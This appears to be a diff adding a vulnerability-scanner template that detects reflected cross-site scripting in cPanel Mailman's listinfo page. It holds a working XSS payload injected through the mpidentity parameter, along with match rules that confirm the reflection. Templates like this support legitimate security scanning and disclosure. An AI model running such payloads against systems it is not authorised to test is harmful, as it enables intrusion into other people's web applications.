@@ -1,0 +1,26 @@
+id: cpanel-mailman-xss
+brief:
+    title: cPanel Mailman - Cross-Site Scripting
+    by: yshahinzadeh
+    level: medium
+    about: cPanel Mailman listinfo reflects the `mpidentity` query parameter into the HTML response without proper output encoding, resulting in reflected cross-site scripting.
+    label:
+        - xss
+        - cpanel
+        - mailman
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E'
+      signs:
+        - "on": word
+          has:
+            - </script><svg/onload=alert(document.domain)>
+            - mailman
+            - gnu-head-tiny
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
